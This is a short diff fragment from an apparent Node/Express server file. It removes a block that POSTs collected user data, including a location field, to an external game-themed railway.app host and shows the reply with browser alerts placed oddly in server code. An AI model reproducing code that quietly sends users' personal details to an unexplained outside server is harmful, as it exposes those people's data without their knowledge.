@@ -19,19 +19,6 @@ Location: ${user.location}
 --------------------------
 `;
     
-try {
-    const res = await fetch("https://pubg-mobile-production-7acb.up.railway.app/save", {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body: JSON.stringify(data)
-    });
-
-    const result = await res.json();
-    alert(result.message);
-
-} catch (err) {
-    alert("Error connecting to server ❌");
-}
 app.get("/", (req, res) => {
     res.send("Server is running ✅");
 });
